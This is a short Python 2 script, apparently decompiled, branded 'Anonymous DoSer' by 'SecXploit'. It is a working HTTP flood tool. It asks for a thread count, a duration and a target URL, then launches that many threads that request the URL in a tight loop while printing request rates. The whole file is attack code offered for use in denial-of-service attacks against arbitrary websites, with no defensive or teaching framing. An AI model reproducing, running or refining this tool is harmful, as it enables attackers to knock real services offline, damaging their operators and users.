# Embedded file name: test.py
import urllib, os, threading, time, sys
if sys.platform == "linux2" or sys.platform == "linux":
	R = ("\033[31m")
	W = ("\033[0;1m")
	B = ("\033[35m")
	G = ("\033[32m")
	glp = ("\033[2m")
	Y = ("\033[33;1m")
else:
	R = ""
	W = ""
	Y = ""
	B = ""
	G = ""
	glp = ""
	
	os.system('clear');
#######################################################################
print (R+"\n                    #########################################\n")
print (Y+"                 80800808.....::"+R+"Anonymous DoSer"+Y+"::.....808088080\n")
print (R+"                    *****************************************")
print
print (Y+"                 \t Tool Ddos"+R+" Attack By"+B+" SecXploit \n")
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: DDoS by SecXploit :::::........')
    print ('');
Close = False
Lock = threading.Lock()
Request = 0
Tot_req = 0

class Spammer(threading.Thread):

    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number

    def run(self):
        global Lock
        global Tot_req
        global Close
        global Request
        Lock.acquire()
        print 'Starting thread #{0}'.format(self.num)
        Lock.release()
        while Close == False:
            try:
                urllib.urlopen(self.url)
                Request += 1
                Tot_req += 1
            except:
                pass

        Lock.acquire()
        print 'Closing thread #{0}'.format(self.num)
        Lock.release()
        sys.exit(0)


if __name__ == '__main__':
    try:
        num_threads = input(G+"["+R+"+"+G+"]"+W+" Power"+R+"(1000): ")
        t_tot = input(G+"["+R+"+"+G+"]"+W+"Time"+R+"(2): ")
    except:
        t_tot = 2

    timer = t_tot * 60
    t_tot = t_tot * 60
    while True:
        url = raw_input('[+] Target : ')
        try:
            urllib.urlopen(url)
        except IOError:
            print (R+"Could not open specified url.")
        else:
            break

    for i in xrange(num_threads):
        Spammer(url, i + 1).start()

    time.sleep(2)
    print (R+"#######################################################################")
    print (Y+"\n> Bot Are Loaded Sucessfully.")
    print (R+"\n> DarkNess1921 is working hard. . .\n")
    while timer > 0:
        time.sleep(10)
        print R+'> DarkNess1921 @ ' + str(Request / 10.0) + ' Requests/s\tTotal Request: #' + str(Tot_req) + '\tTime left:', timer, 's'
        Request = 0
        timer -= 10

    print '\n> Average  @ ' + str(Tot_req / t_tot) + ' Requests/s'
    print '\n#######################################################################\n'
    raw_input('> DarkNess1921 is still working, now you can press enter to shutting down threads.')
    time.sleep(1)
    Close = True